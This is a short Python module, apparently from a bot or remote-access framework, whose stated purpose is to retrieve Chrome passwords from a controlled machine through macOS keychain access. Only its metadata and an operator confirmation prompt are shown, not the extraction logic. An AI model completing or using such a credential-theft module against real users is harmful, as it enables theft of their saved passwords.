# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve Chrome passwords.",
            "References": [
                "https://github.com/manwhoami/OSXChromeDecrypt"
            ],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        confirm = self._view.prompt("Are you sure you want to continue? [Y/n]: ", [
            ("This will prompt the bot to allow keychain access.", "attention")
        ]).lower()

        if not confirm or confirm == "y":
            return True, None
        else:
            self._view.output("Cancelled", "info")
            return False, None
